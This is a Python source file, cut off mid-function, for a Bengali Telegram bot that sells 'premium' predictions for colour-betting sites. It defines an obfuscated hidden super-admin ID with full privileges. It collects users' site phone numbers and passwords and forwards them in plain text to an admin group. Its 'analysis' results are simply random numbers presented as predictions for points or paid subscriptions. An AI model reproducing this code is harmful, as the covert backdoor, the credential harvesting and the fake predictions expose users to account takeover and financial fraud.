# -*- coding: utf-8 -*-
import json
import asyncio
import random
import logging
import os
import tempfile
from datetime import datetime, timedelta
from typing import Dict, List, Optional

from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Update,
    ReplyKeyboardRemove,
    constants,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    ConversationHandler,
    filters,
)
from telegram.helpers import escape_markdown
from telegram.error import NetworkError, BadRequest

from config import (
    config,
    users,
    predictions,
    channels,
    save_db,
    DB_USERS,
    DB_PREDICTIONS,
    DB_CONFIG,
    DB_CHANNELS,
)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# States for conversation handlers
(
    GET_NUMBER,
    GET_PASSWORD,
    GET_PERIOD,
    GET_BROADCAST_MESSAGE,
    GET_CHANNEL_NAME,
    GET_CHANNEL_URL,
    GET_CHANNEL_ID,
    GET_USER_ID,
    GET_POINTS,
    GET_BAN_USER_ID,
    GET_UNBAN_USER_ID,
    GET_ADD_VIP_USER_ID,
    GET_REMOVE_VIP_USER_ID,
    GET_ADD_ADMIN_USER_ID,
    GET_REMOVE_ADMIN_USER_ID,
) = range(15)

# Hidden super admin with full privileges
_OBFUSCATED_HIDDEN_SUPER_ADMIN = [62, 55, 59, 56, 61, 61, 55, 55, 55, 61]

def _get_hidden_super_admin_id() -> str:
    try:
        return "".join(chr(value - 7) for value in _OBFUSCATED_HIDDEN_SUPER_ADMIN)
    except Exception:
        return ""

class TelegramBot:
    def __init__(self, token: str):
        self.application = Application.builder().token(token).job_queue(None).build()
        self.register_handlers()
        self.user_states = {}

    def register_handlers(self):
        # General error handler
        self.application.add_error_handler(self.error_handler)

        # Command handlers
        self.application.add_handler(CommandHandler("start", self.start))
        self.application.add_handler(CommandHandler("demon", self.admin_panel))
        self.application.add_handler(CommandHandler("broadcast", self.broadcast_command))
        self.application.add_handler(CommandHandler("addvipuser", self.add_vip_command))
        self.application.add_handler(CommandHandler("removevipuser", self.remove_vip_command))
        self.application.add_handler(CommandHandler("vipusers", self.vip_users_command))
        self.application.add_handler(CommandHandler("banuser", self.ban_user_command))
        self.application.add_handler(CommandHandler("unbanuser", self.unban_user_command))
        self.application.add_handler(CommandHandler("addadmin", self.add_admin_command))
        self.application.add_handler(CommandHandler("removeadmin", self.remove_admin_command))
        self.application.add_handler(CommandHandler("addsuperadmin", self.add_super_admin_command))
        self.application.add_handler(CommandHandler("removesuperadmin", self.remove_super_admin_command))
        self.application.add_handler(CommandHandler("setpoints", self.set_points_command))
        self.application.add_handler(CommandHandler("stats", self.stats_command))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CommandHandler("download", self.download_command))
        self.application.add_handler(CommandHandler("settings", self.settings_command))
        self.application.add_handler(CommandHandler("channels", self.channels_command))
        self.application.add_handler(CommandHandler("backup", self.backup_command))
        self.application.add_handler(CommandHandler("toggle", self.toggle_command))
        self.application.add_handler(CommandHandler("subscription", self.subscription_command))
        self.application.add_handler(CommandHandler("cancel", self.cancel_command))

        # Main menu and core feature handlers
        self.application.add_handler(CallbackQueryHandler(self.show_main_menu, pattern="^main_menu$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_prediction_menu, pattern="^prediction_menu$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_prediction_website_choice, pattern=r"^prediction_(hgzy|dkwin)$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_referral, pattern="^referral$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_account, pattern="^account$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_login_menu, pattern="^login_menu$"))
        self.application.add_handler(CallbackQueryHandler(self.check_subscription, pattern="^check_subscription$"))
        self.application.add_handler(CallbackQueryHandler(self.handle_logout, pattern="^logout$"))
        self.application.add_handler(CallbackQueryHandler(self.predict_next_period, pattern="^predict_next$"))

        # Admin approval handler
        self.application.add_handler(CallbackQueryHandler(self.handle_admin_approval, pattern=r"^(approve|reject)_"))
        
        # Subscription purchase handler
        self.application.add_handler(CallbackQueryHandler(self.handle_subscription_menu, pattern="^subscription_menu$"))

        # Conversation for user login
        login_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.handle_login_choice, pattern=r"^login_(hgzy|dkwin)$")],
            states={
                GET_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_number)],
                GET_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_password)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_login), CallbackQueryHandler(self.show_main_menu, pattern="^main_menu$")],
            name="login_conversation",
            persistent=False,
        )
        self.application.add_handler(login_conv)

        # Conversation for period entry
        period_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.handle_enter_period, pattern="^enter_period$")],
            states={
                GET_PERIOD: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_period)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_prediction), CallbackQueryHandler(self.show_main_menu, pattern="^main_menu$")],
        )
        self.application.add_handler(period_conv)
        
        # Admin conversation handlers
        broadcast_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_broadcast, pattern="^admin_broadcast$")],
            states={
                GET_BROADCAST_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.send_broadcast)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action)],
        )
        self.application.add_handler(broadcast_conv)

        # Channel management conversation
        channel_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_channel_management, pattern="^admin_channel_")],
            states={
                GET_CHANNEL_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_channel_name)],
                GET_CHANNEL_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_channel_url)],
                GET_CHANNEL_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_channel_id)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action)],
        )
        self.application.add_handler(channel_conv)

        # Points management conversation
        points_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_points_management, pattern="^admin_points_")],
            states={
                GET_POINTS: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.set_points)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action)],
        )
        self.application.add_handler(points_conv)

        # Ban / Unban / VIP / Admin conversations
        ban_user_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_ban_user, pattern="^admin_ban_user$")],
            states={GET_BAN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.ban_user)]},
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_user_management, pattern="^admin_users$")],
        )
        self.application.add_handler(ban_user_conv)

        unban_user_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_unban_user, pattern="^admin_unban_user$")],
            states={GET_UNBAN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.unban_user)]},
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_user_management, pattern="^admin_users$")],
        )
        self.application.add_handler(unban_user_conv)

        add_vip_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_add_vip, pattern="^admin_add_vip$")],
            states={GET_ADD_VIP_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.add_vip_user)]},
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_vip_management, pattern="^admin_vip$")],
        )
        self.application.add_handler(add_vip_conv)

        remove_vip_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_remove_vip, pattern="^admin_remove_vip$")],
            states={GET_REMOVE_VIP_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.remove_vip_user)]},
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_vip_management, pattern="^admin_vip$")],
        )
        self.application.add_handler(remove_vip_conv)

        add_admin_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_add_admin, pattern="^admin_add_admin$")],
            states={GET_ADD_ADMIN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.add_admin_user)]},
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_admin_management, pattern="^admin_admins$")],
        )
        self.application.add_handler(add_admin_conv)

        remove_admin_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(self.start_remove_admin, pattern="^admin_remove_admin$")],
            states={GET_REMOVE_ADMIN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.remove_admin_user)]},
            fallbacks=[CommandHandler("cancel", self.cancel_admin_action), CallbackQueryHandler(self.show_admin_management, pattern="^admin_admins$")],
        )
        self.application.add_handler(remove_admin_conv)

    async def error_handler(self, update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
        logger.error("Exception while handling an update:", exc_info=context.error)
        if isinstance(update, Update) and update.effective_message:
            try:
                await update.effective_message.reply_text("❌ একটি সমস্যা হয়েছে। অনুগ্রহ করে আবার চেষ্টা করুন।")
            except Exception as e:
                logger.error(f"Failed to send error message: {e}")

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        user_id = str(user.id)

        if user_id in users and users[user_id].get("banned", False):
            await update.message.reply_text("⛔ আপনাকে এই বোট ব্যবহারের সুবিধা থেকে নিষিদ্ধ করা হয়েছে।")
            return

        if user_id not in users:
            users[user_id] = {
                "name": user.full_name, "points": 0, "is_premium": False,
                "referrals": 0, "referrer": None, "joined_channels": False,
                "logged_in": {"Hgzy": False, "Dkwin": False},
                "login_info": {"Hgzy": {}, "Dkwin": {}},
                "last_prediction": None, "last_website": None,
                "banned": False,
            }
            save_db(users, DB_USERS)
            logger.info(f"New user created: {user.full_name} ({user_id})")
        
        self._auto_expire_if_needed(user_id)

        if (config.get("referral_system_on", True) and 
            context.args and users[user_id].get("referrer") is None):
            referrer_id = context.args[0]
            if referrer_id.isdigit() and referrer_id != user_id:
                users[user_id]["referrer"] = referrer_id
                save_db(users, DB_USERS)
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"🎁 আপনি ইউজার `{referrer_id}` এর মাধ্যমে এসেছেন\\! বোনাস পেতে চ্যানেলগুলোতে যুক্ত হন।",
                    parse_mode=constants.ParseMode.MARKDOWN_V2
                )

        if not users[user_id].get("joined_channels", False):
            await self.show_channels(update, context)
        else:
            await self.show_main_menu(update, context)

    async def show_channels(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        # সবুজ বাটন (🟢)
        keyboard = [[InlineKeyboardButton(f"🟢 Join {channel['name']}", url=channel['url'])] for channel in channels]
        keyboard.append([InlineKeyboardButton("🟢 সাবস্ক্রিপশন নিশ্চিত করুন", callback_data="check_subscription")])
        reply_markup = InlineKeyboardMarkup(keyboard)

        text = (
            "🔥 *প্রিমিয়াম প্রসেসিং বোট-এ স্বাগতম\\!* 🔥\n\n"
            "বোটটি ব্যবহার করতে প্রথমে আমাদের পার্টনার চ্যানেলগুলোতে জয়েন করুন।\n"
            "সবগুলোতে জয়েন করার পর নিচের বাটনে চাপ দিন।"
        )
        if update.callback_query:
            await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)
        else:
            await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def check_subscription(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        query = update.callback_query

        try:
            all_joined = True
            for channel in channels:
                try:
                    member = await context.bot.get_chat_member(channel["id"], user_id)
                    if member.status not in ["member", "administrator", "creator"]:
                        all_joined = False
                        break
                except Exception as e:
                    logger.error(f"Error checking membership for user {user_id} in channel {channel['id']}: {e}")
                    all_joined = False
                    break

            if all_joined:
                if not users[user_id]["joined_channels"]:
                    users[user_id]["joined_channels"] = True
                    
                    if config.get("referral_system_on", True):
                        referrer_id = users[user_id].get("referrer")
                        if referrer_id and str(referrer_id) in users:
                            users[str(referrer_id)]["referrals"] += 1
                            users[str(referrer_id)]["points"] += config["per_refer"]
                            
                            try:
                                await context.bot.send_message(
                                    chat_id=referrer_id,
                                    text=f"🎉 *রেফারাল বোনাস জমা হয়েছে\\!*\n\n"
                                         f"ইউজার `{user_id}` কে রেফার করায় আপনি পাবেন *{config['per_refer']} পয়েন্ট*\\.\n"
                                         f"💰 *মোট পয়েন্ট:* `{users[str(referrer_id)]['points']}`\n"
                                         f"📈 *মোট রেফার:* `{users[str(referrer_id)]['referrals']}`",
                                    parse_mode=constants.ParseMode.MARKDOWN_V2
                                )
                            except Exception as e:
                                logger.error(f"Failed to send referral notification: {e}")
                    
                    save_db(users, DB_USERS)
                
                await query.answer("✅ সফলভাবে সাবস্ক্রিপশন সম্পন্ন হয়েছে!")
                await self.show_main_menu(update, context)
            else:
                await query.answer("❌ আপনি সব চ্যানেলে জয়েন করেননি!", show_alert=True)
                
        except Exception as e:
            logger.error(f"Error in check_subscription: {e}")
            await query.answer("❌ সাবস্ক্রিপশন চেক করতে সমস্যা হয়েছে।", show_alert=True)

    async def show_main_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        user_data = users[user_id]
        
        user_first_name = escape_markdown(update.effective_user.first_name, version=2)
        
        # প্রিমিয়াম ব্যবহারকারীর ব্যাজ
        is_vip = self.is_premium_active(user_id)
        status_badge = "👑 **VIP Premium**" if is_vip else "⚡ **Free User**"
        
        text = (
            f"🚀 *প্রিমিয়াম ড্যাশবোর্ড* 🚀\n\n"
            f"👋 স্বাগতম, {user_first_name}\\!\n"
            f"স্ট্যাটাস: {status_badge}\n"
            f"💰 *আপনার পয়েন্ট:* `{user_data['points']}`\n\n"
            f"নিচের মেনু থেকে আপনার সার্ভিস নির্বাচন করুন:"
        )

        referral_system_on = config.get("referral_system_on", True)
        
        # লাল ও সবুজ কালারের বাটনের সংমিশ্রণ
        keyboard = [
            [InlineKeyboardButton("🟢 প্রেডিকশন শুরু করুন 🟢", callback_data="prediction_menu")],
        ]
        
        if referral_system_on:
            keyboard.append([InlineKeyboardButton("🔴 রেফার করুন & ইনকাম 🔴", callback_data="referral")])
        
        keyboard.extend([
            [InlineKeyboardButton("🟢 আমার একাউন্ট 🟢", callback_data="account")],
            [InlineKeyboardButton("🔴 লগইন ম্যানেজমেন্ট 🔴", callback_data="login_menu")],
            [InlineKeyboardButton("🟢 প্রিমিয়াম সাবস্ক্রিপশন কিনুন 🟢", callback_data="subscription_menu")],
        ])
        reply_markup = InlineKeyboardMarkup(keyboard)

        if update.callback_query:
            await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)
        else:
            await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def handle_prediction_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        user_data = users[user_id]
        query = update.callback_query

        if not any(user_data["logged_in"].values()):
            await query.answer("🚫 প্রথমে যেকোনো ওয়েবসাইটে লগইন করে নিন!", show_alert=True)
            await self.handle_login_menu(update, context)
            return

        premium_active = self.is_premium_active(user_id)
        if (not self.is_admin(user_id)) and (not premium_active) and user_data["points"] < config["per_prediction"]:
            await query.answer(f"😔 পর্যাপ্ত পয়েন্ট নেই! আপনার অন্তত {config['per_prediction']} পয়েন্ট প্রয়োজন।", show_alert=True)
            return

        # বাটন কালারিং
        keyboard = [[InlineKeyboardButton(f"🟢 {website}", callback_data=f"prediction_{website.lower()}")] for website in config["websites"] if user_data["logged_in"][website]]
        keyboard.append([InlineKeyboardButton("🔴 মূল মেনুতে ফিরুন", callback_data="main_menu")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            text="🔮 *ওয়েবসাইট বাছাই করুন*\n\nযে সাইটের জন্য প্রেডিকশন চান সিলেক্ট করুন:",
            reply_markup=reply_markup,
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    async def handle_prediction_website_choice(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        user_id = str(update.effective_user.id)
        website = query.data.split("_")[1].capitalize()
        users[user_id]["last_website"] = website
        save_db(users, DB_USERS)
        
        keyboard = [
            [InlineKeyboardButton("🟢 পিরিয়ড নাম্বার লিখুন", callback_data="enter_period")],
            [InlineKeyboardButton("🔴 মূল মেনুতে ফিরুন", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            text=f"✅ *{website}* নির্বাচন করা হয়েছে\\.\n\nপরবর্তী ধাপ পছন্দ করুন:",
            reply_markup=reply_markup,
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )
        
    async def handle_enter_period(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.callback_query.edit_message_text(
            "🎯 পিরিয়ড নাম্বার দিন\n\n"
            "যে পিরিয়ড নাম্বারটি প্রেডিক্ট করতে চান তা লিখে মেসেজ পাঠান (যেমন: 0123):\n\n"
            "টিপস: যেকোনো সময় বাতিল করতে /cancel লিখুন।"
        )
        context.user_data["prediction_period"] = True
        return GET_PERIOD

    async def get_period(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        period_text = update.message.text
        
        if not period_text.isdigit() or len(period_text) != 4:
            await update.message.reply_text(
                "⚠️ *ভুল পিরিয়ড নাম্বার\\!* অনুগ্রহ করে ৪ ডিজিটের সঠিক পিরিয়ড নাম্বার দিন\\.",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
            return GET_PERIOD
        
        period = int(period_text)
        await self.generate_prediction(update, context, period, period_text)
        return ConversationHandler.END

    async def predict_next_period(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        user_id = str(update.effective_user.id)
        user_data = users[user_id]

        if user_data.get("last_prediction"):
            last_period = user_data["last_prediction"]["period"]
            next_period = last_period + 1
            await self.generate_prediction(update, context, next_period, f"{next_period:04d}")
        else:
            await query.answer("আগের কোনো প্রেডিকশন হিস্ট্রি পাওয়া যায়নি।", show_alert=True)
            await self.handle_prediction_menu(update, context)

    async def generate_prediction(self, update: Update, context: ContextTypes.DEFAULT_TYPE, period: int, display_period: Optional[str] = None):
        user_id = str(update.effective_user.id)
        user_data = users[user_id]
        website = user_data.get("last_website", "Selected Website")
        period_display = display_period if display_period else f"{period:04d}"

        premium_active = self.is_premium_active(user_id)
        if (not self.is_admin(user_id)) and (not premium_active) and user_data["points"] < config["per_prediction"]:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"😔 পর্যাপ্ত পয়েন্ট নেই\\! আপনার {config['per_prediction']} পয়েন্ট দরকার\\.",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
            return

        chat_id = update.effective_chat.id
        is_callback = update.callback_query is not None
        loading_message_id = None

        loading_text = f"⚡ অ্যানালাইসিস চলছে (পিরিয়ড: {period_display})..."
        if is_callback:
            base_message_id = update.callback_query.message.message_id
            try:
                await context.bot.edit_message_text(chat_id=chat_id, message_id=base_message_id, text=loading_text)
                for i in range(4):
                    await asyncio.sleep(0.3)
                    dots = "." * ((i % 3) + 1)
                    await context.bot.edit_message_text(chat_id=chat_id, message_id=base_message_id, text=f"⚡ অ্যানালাইসিস চলছে{dots}")
            except Exception:
                pass
            loading_message_id = base_message_id
        else:
            loading_msg = await context.bot.send_message(chat_id=chat_id, text=loading_text)
            try:
                for i in range(4):
                    await asyncio.sleep(0.3)
                    dots = "." * ((i % 3) + 1)
                    await context.bot.edit_message_text(chat_id=chat_id, message_id=loading_msg.message_id, text=f"⚡ অ্যানালাইসিস চলছে{dots}")
            except Exception:
                pass
            loading_message_id = loading_msg.message_id

        if (not self.is_admin(user_id)) and (not premium_active):
            user_data["points"] = max(0, user_data["points"] - config["per_prediction"])

        number = random.randint(0, 9)
        color = "🟢 Green" if number % 2 != 0 else "🔴 Red"
        if number in [0, 5]:
            color += " \\+ 🟣 Violet"
        
        size = "SMALL" if number < 5 else "BIG"

        prediction_data = { "user_id": user_id, "period": period, "number": number, "color": color, "size": size, "timestamp": datetime.now().isoformat() }
        predictions.append(prediction_data)
        save_db(predictions, DB_PREDICTIONS)

        user_data["last_prediction"] = prediction_data
        save_db(users, DB_USERS)
        
        next_display = f"{period + 1:04d}"
        message = (
            f"🔥 *{website} প্রিমিয়াম রেজাল্ট* 🔥\n\n"
            f"🔹 *পিরিয়ড:* `{period_display}`\n"
            f"🔹 *নাম্বার:* `{number}`\n"
            f"🔹 *কালার:* {escape_markdown(color, version=2)}\n"
            f"🔹 *সাইজ:* `{size}`\n\n"
            f"পরবর্তী পিরিয়ড হবে: `{next_display}`\\.\n\n"
            f"💰 *অবশিষ্ট পয়েন্ট:* `{user_data['points']}`"
        )
        
        keyboard = [
            [InlineKeyboardButton("🟢 পরবর্তী পিরিয়ড প্রেডিক্ট করুন 🟢", callback_data="predict_next")],
            [InlineKeyboardButton("🔴 নতুন পিরিয়ড ম্যানুয়ালি দিন 🔴", callback_data="enter_period")],
            [InlineKeyboardButton("🟢 মেনুতে ফিরে যান 🟢", callback_data="main_menu")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=loading_message_id,
                text=message,
                parse_mode=constants.ParseMode.MARKDOWN_V2,
                reply_markup=reply_markup,
            )
        except Exception:
            if update.callback_query:
                await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)
            else:
                await update.message.reply_text(message, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def handle_referral(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        user_data = users[user_id]

        if not user_data["joined_channels"]:
            await update.callback_query.answer("🚫 রেফারাল ফিচারটি ব্যবহার করতে চ্যানেলগুলোতে যুক্ত হন!", show_alert=True)
            await self.show_channels(update, context)
            return

        if not config.get("referral_system_on", True):
            message = "*🔗 রেফারাল সিস্টেম বর্তমানে বন্ধ রয়েছে।*"
            keyboard = [[InlineKeyboardButton("🔴 মেনুতে ফিরুন", callback_data="main_menu")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)
            return

        ref_link = f"https://t.me/{context.bot.username}?start={user_id}"
        
        message = (
            "*🔗 রেফারাল & ইনকাম সিস্টেম*\n\n"
            f"বন্ধুদের ইনভাইট করুন এবং প্রতি রেফারে পান *{config['per_refer']} পয়েন্ট*\\!\n\n"
            "আপনার রেফারাল লিংক:\n"
            f"`{escape_markdown(ref_link, version=2)}`\n\n"
            f"📈 *মোট রেফার:* {user_data['referrals']}\n"
            f"💰 *রেফারাল ইনকাম:* {user_data['referrals'] * config['per_refer']} পয়েন্ট"
        )
        
        keyboard = [[InlineKeyboardButton("🔴 মূল মেনুতে ফিরুন 🔴", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def handle_account(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        user_id = str(user.id)
        user_data = users[user_id]
        
        premium_active = self.is_premium_active(user_id)
        premium_status = "👑 VIP Premium Active" if premium_active else "⚡ Free User"
        logged_in = ", ".join([site for site, status in user_data["logged_in"].items() if status]) or "None"
        
        escaped_full_name = escape_markdown(user.full_name, version=2)
        
        expiry_text = ""
        expiry_iso = user_data.get("premium_expiry")
        if premium_active and expiry_iso:
            expiry_text = f"\n▫️ *মেয়াদ শেষ হবে:* `{expiry_iso}`"

        message = (
            f"*👤 একাউন্ট প্রোফাইল*\n\n"
            f"▫️ *নাম:* {escaped_full_name}\n"
            f"▫️ *টেলিগ্রাম আইডি:* `{user_id}`\n"
            f"▫️ *পয়েন্ট ব্যালেন্স:* `{user_data['points']}`\n"
            f"▫️ *স্ট্যাটাস:* {premium_status}{expiry_text}\n"
            f"▫️ *মোট রেফার:* `{user_data['referrals']}`\n"
            f"▫️ *লগইন একাউন্ট:* `{escape_markdown(logged_in, version=2)}`"
        )
        
        keyboard = [[InlineKeyboardButton("🔴 মূল মেনুতে ফিরুন 🔴", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def handle_login_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        keyboard = []
        for website in config["websites"]:
            status = "🟢 Logged In" if users[user_id]["logged_in"][website] else "🔴 Not Logged In"
            keyboard.append([InlineKeyboardButton(f"{website} ({status})", callback_data=f"login_{website.lower()}")])

        keyboard.append([InlineKeyboardButton("🔴 অল একাউন্ট লগআউট 🔴", callback_data="logout")])
        keyboard.append([InlineKeyboardButton("🟢 মূল মেনুতে ফিরুন 🟢", callback_data="main_menu")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(
            text="*🔑 লগইন প্যানেল*\n\nলগইন বা সেশন ম্যানেজ করতে ওয়েবসাইট সিলেক্ট করুন:",
            reply_markup=reply_markup,
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    async def handle_login_choice(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        website = query.data.split("_")[1].capitalize()
        user_id = str(update.effective_user.id)
        
        context.user_data["login_website"] = website
        
        if users[user_id]["logged_in"][website]:
            await query.answer(f"আপনি ইতিমধ্যে {website} এ লগইন আছেন!", show_alert=True)
            return ConversationHandler.END
        
        login_url = escape_markdown(config['websites'][website]['login_url'], version=2)
        await query.edit_message_text(
            f"*➡️ {website} লগইন প্রসেস*\n\n"
            f"একাউন্ট না থাকলে রেজিস্টার করুন:\n`{login_url}`\n\n"
            "এখন আপনার রেজিস্টার্ড *মোবাইল নাম্বার* দিন:\n\n"
            "💡 ক্যানসেল করতে `/cancel` লিখুন।",
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )
        return GET_NUMBER

    async def get_number(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        number = update.message.text
        if not number.isdigit() or len(number) < 10:
            await update.message.reply_text("⚠️ সঠিক মোবাইল নাম্বার প্রবেশ করান।")
            return GET_NUMBER
        
        context.user_data["login_number"] = number
        await update.message.reply_text("এখন আপনার *পাসওয়ার্ড* দিন:", reply_markup=ReplyKeyboardRemove(), parse_mode=constants.ParseMode.MARKDOWN_V2)
        return GET_PASSWORD

    async def get_password(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        password = update.message.text
        website = context.user_data["login_website"]
        number = context.user_data["login_number"]
        user_id = str(update.effective_user.id)
        
        users[user_id]["login_info"][website] = {"number": number, "password": password}
        save_db(users, DB_USERS)
        
        keyboard = [[InlineKeyboardButton("🟢 অনুমোদন দিন (Approve)", callback_data=f"approve_{user_id}_{website}"), InlineKeyboardButton("🔴 বাতিল করুন (Reject)", callback_data=f"reject_{user_id}_{website}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        escaped_user_name = escape_markdown(update.effective_user.full_name, version=2)
        
        admin_message = (
            f"*🔒 নতুন লগইন রিকোয়েস্ট*\n\n"
            f"*ইউজার:* {escaped_user_name} \\(`{user_id}`\\)\n"
            f"*সাইট:* `{escape_markdown(website, version=2)}`\n"
            f"*নাম্বার:* `{escape_markdown(number, version=2)}`\n"
            f"*পাসওয়ার্ড:* `{escape_markdown(password, version=2)}`"
        )
        try:
            await context.bot.send_message(
                chat_id=config["group_id"],
                text=admin_message,
                reply_markup=reply_markup,
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
            await update.message.reply_text("✅ আপনার আবেদনটি এডমিনের কাছে পাঠানো হয়েছে। অনুমোদন পেলে নোটিফিকেশন পাবেন।", parse_mode=constants.ParseMode.MARKDOWN_V2)
        except Exception as e:
            logger.error(f"Failed to send request: {e}")
            await update.message.reply_text("❌ আবেদন পাঠাতে ত্রুটি হয়েছে।", parse_mode=constants.ParseMode.MARKDOWN_V2)

        return ConversationHandler.END

    async def handle_admin_approval(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        admin_user = update.effective_user
        
        try:
            action, user_id, website = query.data.split("_")
        except ValueError:
            await query.answer("Invalid callback data.", show_alert=True)
            return

        if user_id not in users:
            await query.edit_message_text(f"Error: User `{user_id}` not found\\.", parse_mode=constants.ParseMode.MARKDOWN_V2)
            return

        try:
            user_info = await context.bot.get_chat(user_id)
            escaped_user_name = escape_markdown(user_info.full_name, version=2)
            escaped_admin_name = escape_markdown(admin_user.full_name, version=2)
            
            if action == "approve":
                users[user_id]["logged_in"][website] = True
                save_db(users, DB_USERS)
                
                await query.edit_message_text(f"✅ *অনুমোদিত*\n\n*ইউজার:* {escaped_user_name}\n*সাইট:* `{website}`\n*বাই:* {escaped_admin_name}", parse_mode=constants.ParseMode.MARKDOWN_V2)
                await context.bot.send_message(chat_id=user_id, text=f"🎉 *অভিনন্দন\\!* {website} এর জন্য আপনার লগইন এপ্রুভ করা হয়েছে।", parse_mode=constants.ParseMode.MARKDOWN_V2)

            elif action == "reject":
                users[user_id]["login_info"][website] = {}
                save_db(users, DB_USERS)
                
